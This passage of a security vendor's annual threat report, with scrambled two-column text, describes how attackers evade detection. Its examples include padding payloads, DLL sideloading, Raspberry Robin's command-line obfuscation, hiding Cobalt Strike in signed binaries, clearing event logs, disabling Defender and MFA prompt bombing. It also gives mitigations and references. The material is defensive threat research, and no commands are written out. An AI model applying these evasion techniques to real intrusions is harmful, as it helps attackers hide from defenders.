debugger breakpoints, implementation of sleep commands 

easier to use and help in evading signature\-based detections 

that delay execution in a sandbox environment, insertion 

and malware analysis tools. 

Payload size padding. Large payloads are often skipped 

of ransom instructions to prevent signature detection, and 

searching for evidence of a virtual machine environment.

by antivirus systems in the name of efficiency. Sandboxes 

DLL sideloading. Despite having been around since the year 

typically will not detonate large files. CTU researchers 

2000, DLL sideloading continues to be effective for many 

observed Chinese threat group BRONZE BUTLER97 add 

threat actors. Malware that uses this technique includes 

padding to a LowMain downloader file to take it to over 50MB 

the HUI Loader and ShadowPad malware described earlier, 

to circumvent antivirus scanning, in addition to using various 

PlugX, and the Vatet loader favored by the GOLD DUPONT100 

obfuscation techniques including the Opaque Predicates98 

ransomware group.

code obfuscation technique.

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

57

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Raspberry Robin — Incorporating 
Multiple Evasion Techniques

In early 2022, a number of Secureworks customers were impacted by 

The malware also used alternative syntax (such as the use of 

a new USB worm dubbed 'Raspberry Robin', which uses a number of 

backslashes) in HTTP requests and removed spaces between 

different evasion techniques in an attempt to evade detection. The 

command line switches in an effort to evade string\-matching 

worm uses the trusted Windows Installer (msiexec.exe) process to 

signatures.

beacon out to its C2 infrastructure, which often sits on compromised 

QNAP devices101, using HTTP requests that contain a victim's user and 

device names. CTU researchers also observed Raspberry Robin use 

TOR exit nodes as additional C2 infrastructure.

It also used undocumented command line switches and unusual piping 

commands to evade countermeasures that interpret command line 

arguments (figure 35\). 

Figure 35\. Raspberry Robin use of undocumented command line switches and 
pipe commands. (Source: Secureworks)

Figure 36\. Additional Raspberry Robin defensive evasion. (Source: Secureworks)

CTU researchers observed the threat actor attempting several User 

Account Control (UAC) bypass techniques before ultimately managing 

to execute a DLL payload with a non\-standard extension, another 

evasion technique (figure 37\). In the screenshot, the threat actor is 

also proxying the DLL execution by using the regsvr functionality within 

the database tool odbcconf102, yet another evasion technique.

Figure 37\. Raspberry Robin User Account Control bypass. (Source: 
Secureworks)

2022 State of the Threat: A Year in Review

58

Hiding Behind a Veil of 
Legitimacy — Embedding 
Cobalt Strike in the 
Authenticode Signature

In mid\-2021, CTU researchers analyzed a BRONZE ATLAS103 Cobalt 

Strike loader recovered from a network intrusion against a U.S. entity. 

The decrypted loader configuration identified the location of the 

Cobalt Strike payload file on disk, C:\\Users\\Public\\NTUSER.DAT. NTUSER.

DAT was a signed Windows DLL file (UXLibRes.dll) that included an 

encrypted Cobalt Strike payload after the Authenticode104 signature 

(figure 38\).

Embedding the payload in this way does not break the verification 

of the Authenticode signature, leaving the NTUSER.dat file looking 

legitimate based on having a valid digital signature. Microsoft released 

a security update (MS13\-098105\) to address this vulnerability in 2013, 

but the change is an opt\-in feature106\.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 38\. Cobalt Strike payload embedded in digitally signed Windows binary. 
(Source: Secureworks)

2022 State of the Threat: A Year in Review

59

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Shaping the Environment 
to Bypass Security Controls

Having gained access to an environment, threat actors may find 

that their freedom of movement is restricted (either deliberately or 

• During a Ryuk\-related network intrusion in September 
2021, the ransomware operator added a firewall rule to 

otherwise) by the network architecture, security controls in place, or 

permit outbound network traffic for a legitimate mobsync.

the permissions they have when they gain access. CTU researchers 

exe process that had been injected with Cobalt Strike. 

commonly see threat actors take steps to bypass those restrictions. 

Preventing or at least delaying an adversary from being able 

Some specific examples include:

to escalate privileges to the point where they can manually 

• 

In mid\-2021, a threat actor successfully broke out of 

a Citrix environment using the ‘Open With’ dialog box 

disable security controls is critical. 

• 

In November 2021, a threat actor leveraged the ProxyShell 

within a Microsoft Office application before conducting a 

vulnerability to access an internet\-facing server and deploy 

Kerberoasting attack to obtain privileged credentials. This 

Cobalt Strike. While doing so, the threat actor cleared 

Citrix break\-out technique has been well documented for 

Windows event logs on the compromised server using a 

many years. Organizations should perform regular security 

simple for loop on the command line (figure 39\).

testing to identify any potential 'escape routes' from 

constrained environments.

Figure 39\. Command line to clear Windows event logs. (Source: Secureworks)

2022 State of the Threat: A Year in Review

60

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

• 

In December 2021, a threat actor compromised an internet\-

• 

In mid\-2022, a threat actor conducting a BEC attack 

facing server leveraging the Log4Shell vulnerability and 

created a mail\-forwarding rule to forward all received emails 

issued a Base64\-encoded PowerShell command to disable 

to an external email address. Mail forwarding rules are 

Windows Defender (figure 40\). Base64\-encoding can make 

common in email account compromises, as threat actors 

command line arguments harder for analysts and security 

seek to hide their activities from the compromised user, 

tools to parse, but the presence of Base64\-encoded 

but it is possible to detect this activity through effective 

commands alongside other suspicious events provides its 

monitoring of cloud APIs. 

own detection opportunity. 

Figure 40\. Encoded PowerShell used to disable Defender. (Source: 
Secureworks)

Figure 41\. Taegis XDR telemetry showing creation of mail forwarding rule by 
threat actor. (Source: Secureworks)

2022 State of the Threat: A Year in Review

61

This handful of examples is indicative of the sorts of defensive evasion 

and anti\-analysis techniques routinely encountered by Secureworks 

incident responders. One thing that is notable about them is that none 

of these techniques are particularly sophisticated. That is because 

threat actors do not need them to be; the adversary will only innovate 

enough to achieve their objectives, so there is a direct relationship 

between the maturity of the controls in a target environment and the 

techniques they employ to bypass those controls. Another notable 

point is that these techniques create patterns that can be used for 

detecting threat actor activity.

Organizations should ensure that they have preventative controls 

implemented to make it harder for an adversary to gain initial access to 

their environment, as well as monitoring tools that challenge a threat 

actor's ability to remain hidden within the environment. The objective 

should be to raise the cost for the adversary and, particularly for 

opportunistic threat actors, encourage them to go elsewhere.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

62

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Bypassing MFA

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\- 
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Credential abuse still represents a substantial proportion of IAVs. Multi\-

reverse proxies to snoop on existing browser sessions to harvest 

factor authentication is an important preventative control, especially 

credentials and session cookies as they appear on screen. This allows 

for internet\-facing applications and accounts with access to critical 

threat actors to hijack already authenticated sessions, bypassing MFA. 

resources. But Secureworks incident responders see regular examples 

Another method110 used Microsoft Edge WebView2 applications to 

of MFA being bypassed through various techniques. On a number of 

steal a user's authentication cookies and log into stolen accounts, 

occasions, threat actors have compromised accounts that have not yet 

even when secured with MFA.

been enrolled in MFA and have registered their own device. In March 

2022, CISA reported107 on a Russian government\-sponsored threat 

actor doing the same thing. 

Another common scenario encountered during Secureworks incident 

response is 'prompt bombing', where a threat actor attempts to access 

a legitimate MFA\-protected account through repeated login attempts, 

generating multiple MFA prompts in the hope that exasperation 

or distraction drives the legitimate user to approve one of them. 

The threat actor may generate multiple requests in a short time 

period, send one or two prompts a day or employ telephone social 

engineering. 

Implementing MFA Properly

• 

Implement MFA across all accounts, including service 

accounts, particularly for remote access to corporate 

resources. This can be achieved by coupling the MFA 

solution to the organization's identity provider.

• Disable legacy protocols that do not support MFA, including 

Microsoft's Basic Auth, which reaches end of life on 

October 1, 2022\.

• Use a service that requires complex interaction to approve 
logins (e.g., number matching or other types of manual 

In one incident observed by CTU researchers, a threat actor used 

code input) rather than simple 'click\-to\-approve' services.

this technique to gain access to the environment and then request a 

password reset on multiple social media accounts owned by the victim. 

The threat actors then sent convincing phishing emails to over 1,000 

employees at the victim's organization in an attempt to compromise 

other accounts. 'Prompt bombing' has also reportedly108 been used 

by the GOLD RAINFOREST (also known as Lapsus$) and IRON RITUAL 

threat groups.

More esoteric techniques reported on by third parties during the 

year also included the use109 of phishing kits that use transparent 

• 

Implement MFA on accounts with access to critical assets, 

even for already authenticated users.

• Train users to recognize and report suspicious behaviors.

• 

Implement MFA as part of a layered security strategy.

• Use network segmentation to prevent the ability of threat 
actors who have gained access to carry out lateral 

movement.

2022 State of the Threat: A Year in Review

63

08
Conclusion

Over the past year, the threat landscape has changed greatly in some 

is critical. Identify the assets you own, maintain awareness of what 

ways, yet in other ways scarcely at all. War in Ukraine has unleashed 

is happening in the threat landscape, and prioritize your control 

a flood of highly targeted cyber activity, but for the most part, it 

framework according to your business risk profile. Adopt a prioritized 

has remained laser\-focused on Ukraine. For most organizations, 

approach to vulnerability management. Ensure that internet\-facing 

ransomware, like last year and the year before, remains the most 

systems and sensitive internal systems are protected with MFA, leaving 

pressing threat. Law enforcement is undoubtedly becoming more 

no loopholes for threat actors to take advantage of. And instrument 

aggressive and effective in disrupting the cybercriminal ecosystem, 

your network to provide comprehensive monitoring of endpoint, 

but these interventions are yet to radically alter the landscape. Gaps 

network, and cloud resources. 

that have appeared in that ecosystem are quickly filled, either by the 

emergence of new actors or the re\-emergence of those previously 

These time\-tried approaches, underpinned with ever\-improving 

thought to have retired. Malware of all types continues to evolve 

technology solutions such as XDR, DDoS protection, and vulnerability 

without breaking any radically new ground, and threat actors are not 

prioritization, protect against nation\-state, cybercriminal, and hacktivist 

yet having to be particularly innovative in order to be successful.

threat actors alike. Now is not the time to let your guard slip.

For organizations facing this picture, the pressure continues to be 

relentless. Implementing good fundamental cybersecurity hygiene 

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

64

09
The Secureworks 
View of the Threat

Secureworks' view of the threat landscape comes from a combination 

This data combines to produce a detailed and compelling picture 

of telemetry from the Taegis XDR and VDR platforms, incident response 

of threat actor behavior that portrays both the thrust of their high\-

and Secureworks Adversary Group customer engagements, and 

level tactics and the technical details of their tooling. It powers the 

technical and tactical research conducted by the Counter Threat Unit. 

expert threat intelligence products published every week by the CTU, 

Together, that combines to produce a unique level of visibility into 

and the unified "Rosetta Stone" that relates our threat groups to the 

threat actor intent, capability, and activity; and just as importantly, into 

naming conventions used by other TI providers. And it contributes to 

what organizations need to do to reduce their risk.

a repository of knowledge that drives the elite threat detection and 

• In the 12 months from July 2021, the Secureworks Incident 
Response team and Secureworks Counter Threat Unit 
conducted over 1,400\+ incident response engagements, 
across a wide spectrum of industry sectors.

• Secureworks processes approximately 3\.29 trillion event 

logs a week, or around 470 billion logs every single working 
day, gathered from security infrastructure in thousands of 
customer environments around the world.

• CTU researchers gather and analyze data from internally 

generated and externally collected telemetry, from multiple 
sources including publicly available information, dark 
web forums, proprietary botnet emulation systems, and 
intelligence relationships. 

integrated response actions that Taegis delivers. 

Actionable Intelligence Based 
on Breadth and Depth 
of Understanding

To be useful, threat intelligence has to be actionable. That means 

providing context on relevant threats in the form of written threat 

intelligence, webcasts, and threat briefings. It also means deploying 

insights directly to the Taegis platform in the form of countermeasures, 

indicators, and advanced detectors.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

2022 State of the Threat: A Year in Review

65

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Drawing on a broad and deep understanding of the threat, CTU\-derived 

countermeasures provide detection value across the entirety of the 

attack lifespan. Figure 42 shows a heat map of detections, mapped 

to ATT\&CK techniques, for confirmed and mitigated security incident 

investigations within the Taegis XDR platform between June 2021 and 

June 2022\.

Gather Victim Org 
Information

Phishing for Information

System Script Proxy 
Execution

Trusted Developer 
Utilities Proxy Execution

Figure 42\. Taegis countermeasure detections mapped to the ATT\&CK matrix for the period June 2021 \- June 2022\. (Source: Secureworks and MITRE's ATT\&CK Navigator111\)

2022 State of the Threat: A Year in Review

66

DOMAINEnterprise ATT\&CK v11PLATFORMSLinux, MacOS, Windows,PRE, Containers, Network,Ofﬁce 365, SaaS, GoogleWorkspace, IaaS, Azure ADLEGEND0\.0140280420560700Active ScanningGather Victim Host InformationGather Victim Identity InformationGather Victim Network InformationSearch Closed SourcesSearch Open Technical DatabasesSearch Open Websites/DomainsSearch Victim\-Owned WebsitesReconnaissanceAcquire InfrastructureCompromise AccountsCompromise InfrastructureDevelop CapabilitiesEstablish AccountsObtain CapabilitiesStage CapabilitiesResource DevelopmentDrive\-by CompromiseExploit Public\-Facing ApplicationExternal Remote ServicesHardware AdditionsPhishingReplication Through Removable MediaSupply Chain CompromiseTrusted RelationshipValid AccountsInitial AccessCommand and Scripting InterpreterContainer Administration CommandDeploy ContainerExploitation for Client ExecutionInter\-Process CommunicationNative APIShared ModulesSoftware Deployment ToolsSystem ServicesUser ExecutionWindows Management InstrumentationExecutionAccount ManipulationBITS JobsBrowser ExtensionsCompromise Client Software BinaryCreate AccountExternal Remote ServicesImplant Internal ImageOfﬁce Application StartupScheduled Task/JobScheduled Task/JobServer Software ComponentPersistenceAbuse Elevation Control MechanismAccess Token ManipulationBoot or Logon Autostart ExecutionBoot or Logon Autostart ExecutionBoot or Logon Initialization ScriptsBoot or Logon Initialization ScriptsCreate or Modify System ProcessCreate or Modify System ProcessDomain Policy ModiﬁcationEscape to HostEvent Triggered ExecutionEvent Triggered ExecutionExploitation for Privilege EscalationHijack Execution FlowHijack Execution FlowProcess InjectionScheduled Task/JobValid AccountsValid AccountsPrivilege EscalationAbuse Elevation Control MechanismAccess Token ManipulationBITS JobsDeobfuscate/Decode Files or InformationDirect Volume AccessDomain Policy ModiﬁcationExecution GuardrailsExploitation for Defense EvasionFile and Directory Permissions ModiﬁcationHide ArtifactsHijack Execution FlowIndirect Command ExecutionMasqueradingModify Authentication ProcessModify Authentication ProcessModify Cloud Computer InfrastructureModify RegistryModify System ImageNetwork Boundary BridgingObfuscated Files or InformationPlist File ModiﬁcationPre\-OS BootPre\-OS BootProcess InjectionRogue Domain ControllerSubvert Trust ControlsSystem Binary Proxy ExecutionTemplate InjectionTrafﬁc SignalingTrafﬁc SignalingUnused/Unsupported Cloud RegionsUse Alternate Authentication MaterialValid AccountsVirtualization/Sandbox EvasionWeaken EncryptionXSL Script ProcessingDefense EvasionAdversary\-in\-the\-MiddleAdversary\-in\-the\-MiddleBrute ForceCredentials from Password StoresExploitation for Credential AccessForced AuthenticationForge Web CredentialsInput CaptureModify Authentication ProcessMulti\-Factor Authentication InterceptionMulti\-Factor Authentication Request GenerationNetwork SnifﬁngOS Credential DumpingSteal Application Access TokenSteal or Forge Kerberos TicketsSteal Web Session CookieUnsecured CredentialsCredential AccessAccount DiscoveryApplication Window DiscoveryBrowser Bookmark DiscoveryCloud Infrastructure DiscoveryCloud Service DashboardCloud Service DiscoveryCloud Storage Object DiscoveryContainer and Resource DiscoveryDebugger EvasionDomain Trust DiscoveryFile and Directory DiscoveryGroup Policy DiscoveryNetwork Service DiscoveryNetwork Share DiscoveryNetwork SnifﬁngPassword Policy DiscoveryPeripheral Device DiscoveryPermission Groups DiscoveryProcess DiscoveryQuery Registry Remote System DiscoverySoftware DiscoverySystem Information DiscoverySystem Location DiscoverySystem Network Conﬁguration DiscoverySystem Network Connections DiscoverySystem Owner/User DiscoverySystem Service DiscoverySystem Time DiscoveryVirtualization/Sandbox EvasionDiscoveryExploitation of Remote ServicesInternal SpearphishingLateral Tool TransferRemote Service Session HijackingRemote ServicesSoftware Deployment ToolsTaint Shared ContentUse Alternate Authentication MaterialLateral MovementArchive Collected DataAudio CaptureAutomated CollectionBrowser Session HijackingClipboard DataData from Cloud Storage ObjectData from Conﬁguration RepositoryData from Information RepositoriesData from Local SystemData from Network Shared DriveData from Removable MediaData StagedEmail CollectionInput CaptureScreen CaptureVideo CaptureCollectionApplication Layer ProtocolCommunication Through Removable MediaData EncodingData ObfuscationDynamic ResolutionEncrypted ChannelFallback ChannelsIngress Tool TransferMulti\-Stage ChannelsNon\-Application Layer ProtocolNon\-Standard PortProtocol TunnelingProxyRemote Access SoftwareWeb ServiceCommand \& ControlAutomated ExﬁltrationData Transfer Size LimitsExﬁltration Over Alternative ProtocolExﬁltration Over C2 ChannelExﬁltration Over Other Network MediumExﬁltration Over Physical MediumExﬁltration Over Web ServiceScheduled TransferTransfer Data to Cloud AccountExﬁltrationAccount Access RemovalData DestructionData Encrypted for ImpactData ManipulationDefacementDisk WipeEndpoint Denial of ServiceFirmware CorruptionInhibit System RecoveryNetwork Denial of ServiceResource HijackingService StopSystem Shutdown/RebootImpactRootkitReﬂective Code LoadingIndicator Removal on HostImpair DefensesDeploy ContainerDebugger EvasionBuild Image on HostReplication Through Removable MediaTrafﬁc SignalingThe detections applied to Taegis XDR focus on being able to detect 

specific instantiations of a given technique. For example, in the case 

of 'OS Credential Dumping' (T1003112\) there are myriad ways that an 

adversary can dump credentials, ranging from the 'living off the land' 

technique described on page 38, to use of functionality provided by 

tools like Mimikatz to dump credentials in memory (figure 43\).

It is through applying a broad and deep understanding of the threat, 

coupled with excellent visibility from different security controls across 

endpoint, network, and cloud, that organizations can rapidly increase 

their security maturity and detect threats as early as possible in the 

attack lifespan.

01

02

03

04

05

06
06

07

07

08

08
09

Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

Conclusion

The Secureworks 
View of the Threat

Figure 43\. In\-memory detection of Mimikatz credential theft tool. 
(Source: Secureworks)

2022 State of the Threat: A Year in Review

67

1 

2 

3 

4 

5 

6 

7 

8 

9 

Learning from Incident Response: 2021 Year in Review, 
Secureworks. 
https://www.secureworks.com/resources/rp\-learning\-from\-
incident\-response\-team\-2021\-year\-in\-review

Letter From Our CTIO

GOLD ULRICK threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-ulrick

GOLD LOUNGE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-lounge

Executive Summary 
and Key Findings

Treasury Sanctions Evil Corp, the Russia\-Based 
Cybercriminal Group Behind Dridex Malware, U.S. 
Department of the Treasury, accessed 7/27/22\. 
https://home.treasury.gov/news/press\-releases/sm845

Ransomware Remains the 
Primary Strategic Threat

GOLD DRAKE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-drake

Ransomware Enablers: 
Loaders and Infostealers

To HADES and Back: UNC2165 Shifts to LOCKBIT to 
Evade Sanctions, Mandiant, accessed 8/4/22\. 
https://www.mandiant.com/resources/unc2165\-shifts\-to\-
evade\-sanctions

Cryptocurrency tumbler, Wikipedia, accessed 7/27/22\. 
https://en.wikipedia.org/wiki/Cryptocurrency\_tumbler

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

GOLD BLACKBURN threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-blackburn

Reward Offers for Information to Bring Conti 
Ransomware Variant Co\-Conspirators to Justice, U.S. 
Department of State, accessed 8/4/22\. 
https://www.state.gov/reward\-offers\-for\-information\-to\-bring\-
conti\-ransomware\-variant\-co\-conspirators\-to\-justice/

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

10 

Latvian National Charged for Alleged Role in 
Transnational Cybercrime Organization, Department of 
Justice, accessed 7/27/22\. 
Defense Evasion Offers Its 
https://www.justice.gov/opa/pr/latvian\-national\-charged\-
Own Detection Opportunities
alleged\-role\-transnational\-cybercrime\-organization

11 

GOLD ULRICK Leaks Reveal Organizational Structure 
and Relationships, Secureworks. 
https://www.secureworks.com/blog/gold\-ulrick\-leaks\-reveal\-
organizational\-structure\-and\-relationships

Conclusion

12 

13 

14 

One of the world's biggest hacker forums taken down, 
Europol, accessed 7/27/22\. 
https://www.europol.europa.eu/media\-press/newsroom/
news/one\-of\-world%E2%80%99s\-biggest\-hacker\-forums\-
taken\-down

The Secureworks 
View of the Threat

4 GOLD MYSTIC threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-mystic

BlueCrab ransomware that keeps performing detection 
evasion, ASEC, accessed 7/27/22\. 
https://asec\-ahnlab\-com.translate.goog/jp/19952/?\_x\_tr\_
sl\=ja\&\_x\_tr\_tl\=en\&\_x\_tr\_hl\=en\&\_x\_tr\_pto\=sc

15 

16 

17 

18 

19 

20 

21 

22 

23 

24 

25 

26 

27 

28 

GOLD SOUTHFIELD threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-southfield

Customer Advisory: Kaseya VSA Software Under Active 
Attack, Secureworks. 
https://www.secureworks.com/blog/kaseya\-vsa\-software\-
under\-active\-attack

EXCLUSIVE Governments turn tables on ransomware 
gang REvil by pushing it offline, Reuters, accessed 
8/2/22\. 
https://www.reuters.com/technology/exclusive\-governments\-
turn\-tables\-ransomware\-gang\-revil\-by\-pushing\-it\-
offline\-2021\-10\-21/

Russia takes down REvil hacking group at U.S. request \- 
FSB, Reuters, accessed 7/27/22\. 
https://www.reuters.com/technology/russia\-
arrests\-dismantles\-revil\-hacking\-group\-us\-request\-
report\-2022\-01\-14/

REvil Development Adds Confidence About GOLD 
SOUTHFIELD Reemergence , Secureworks. 
https://www.secureworks.com/blog/revil\-development\-adds\-
confidence\-about\-gold\-southfield\-reemergence

REvil prosecutions reach a 'dead end,' Russian media 
reports, Cyberscoop, accessed 8/2/22\. 
https://www.cyberscoop.com/revil\-prosecutions\-reach\-a\-
dead\-end\-russian\-media\-reports/

GOLD BLAZER threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
GOLD\-BLAZER

GOLD HAWTHORNE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
GOLD\-HAWTHORNE

GOLD MATADOR threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
GOLD\-MATADOR

GOLD TOMAHAWK threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/GOLD\-
TOMAHAWK

GOLD RAINFOREST threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-rainforest

GOLD CRESTWOOD threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
GOLD\-CRESTWOOD

Lazy Passwords Become Rocket Fuel for Emotet SMB 
Spreader, Secureworks. 
https://www.secureworks.com/blog/lazy\-passwords\-become\-
rocket\-fuel\-for\-emotet\-smb\-spreader

Emotet botnet comeback orchestrated by Conti 
ransomware gang, Bleeping Computer, accessed 
7/27/22\. 
https://www.bleepingcomputer.com/news/security/emotet\-
botnet\-comeback\-orchestrated\-by\-conti\-ransomware\-gang/

29 

30 

GOLD LAGOON threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-lagoon

GOLD SWATHMORE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/gold\-
swathmore

31 

BishopFox / sliver, accessed 8/4/22\. 
https://github.com/BishopFox/sliver

32 WhisperGate: Not NotPetya, Secureworks. 

https://www.secureworks.com/blog/whispergate\-not\-
notpetya

33 

34 

35 

36 

37 

38 

39 

40 

41 

42 

43 

44 

GOLD PRELUDE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-prelude

GOLD ZODIAC threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
gold\-zodiac

Raccoon Stealer malware suspends operations due to 
war in Ukraine, Bleeping Computer, accessed 7/28/22\. 
https://www.bleepingcomputer.com/news/security/raccoon\-
stealer\-malware\-suspends\-operations\-due\-to\-war\-in\-ukraine/ 

Business Email Compromise: The $43 Billion Scam, 
Federal Bureau of Investigation, accessed 7/28/22\. 
https://www.ic3\.gov/Media/Y2022/PSA220504

Federal Bureau of Investigation Internet Crime Report 
2021, Federal Bureau of Investigation, accessed 7/8/22\. 
https://www.ic3\.gov/Media/PDF/AnnualReport/2021\_
IC3Report.pdf

KNOWN EXPLOITED VULNERABILITIES CATALOG, CISA. 
https://www.cisa.gov/known\-exploited\-vulnerabilities\-catalog

Taegis™ VDR. 
https://www.secureworks.com/products/taegis/vdr

Spring Framework, Slintel, accessed 7/28/22\. 
https://www.slintel.com/tech/web\-framework/spring\-
framework\-market\-share

Spring Framework RCE, Early Announcement, Spring, 
accessed 7/28/22\. 
https://spring.io/blog/2022/03/31/spring\-framework\-rce\-
early\-announcement

Log4Shell: Easy to Launch the Attack but Hard to Stick 
the Landing?, Secureworks. 
https://www.secureworks.com/blog/log4shell\-easy\-to\-
launch\-the\-attack\-but\-hard\-to\-stick\-the\-landing

Malicious Cyber Actors Continue to Exploit Log4Shell 
in VMware Horizon Systems, CISA, accessed 7/28/22\. 
https://www.cisa.gov/uscert/ncas/alerts/aa22\-174a

Exploits created for critical F5 BIG\-IP flaw, install patch 
immediately, Bleeping Computer, accessed 7/28/22\. 
https://www.bleepingcomputer.com/news/security/exploits\-
created\-for\-critical\-f5\-big\-ip\-flaw\-install\-patch\-immediately/

68

2022 State of the Threat: A Year in Review06070801020304050607080945 

46 

47 

48 

Microsoft discovers threat actor targeting SolarWinds 
Serv\-U software with 0\-day exploit, Microsoft, 
accessed 7/28/22\. 
https://www.microsoft.com/security/blog/2021/07/13/
microsoft\-discovers\-threat\-actor\-targeting\-solarwinds\-serv\-
u\-software\-with\-0\-day\-exploit/

Letter From Our CTIO

Threat actor DEV\-0322 exploiting ZOHO ManageEngine 
ADSelfService Plus, Microsoft, accessed 7/28/22\. 
https://www.microsoft.com/security/blog/2021/11/08/
threat\-actor\-dev\-0322\-exploiting\-zoho\-manageengine\-
Executive Summary 
adselfservice\-plus/
and Key Findings

MysterySnail attacks with Windows zero\-day, Kaspersky, 
accessed 7/28/22\. 
https://securelist.com/mysterysnail\-attacks\-with\-windows\-
zero\-day/104509/

Ransomware Remains the 
Primary Strategic Threat

BRONZE STARLIGHT Ransomware Operations Use HUI 
Loader, Secureworks. 
https://www.secureworks.com/research/bronze\-starlight\-
ransomware\-operations\-use\-hui\-loader

49 

Ransomware Enablers: 
Loaders and Infostealers

A41APT case \~ Analysis of the Stealth APT Campaign 
Threatening Japan, JPCERT, accessed 7/28/22\. 
http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021\_202\_niwa\-
yanagishita\_en.pdf

50 

51 

BRONZE RIVERSIDE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
BRONZE\-RIVERSIDE

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

The United States, Joined by Allies and Partners, 
Attributes Malicious Cyber Activity and Irresponsible 
State Behavior to the People's Republic of China, The 
White House, accessed 7/28/22\. 
Hostile Government\-
https://www.whitehouse.gov/briefing\-room/
statements\-releases/2021/07/19/the\-united\-states\-
Sponsored Actor Activity 
joined\-by\-allies\-and\-partners\-attributes\-malicious\-
Shows a Regional Focus
cyber\-activity\-and\-irresponsible\-state\-behavior\-to\-the\-
peoples\-republic\-of\-china/

52 

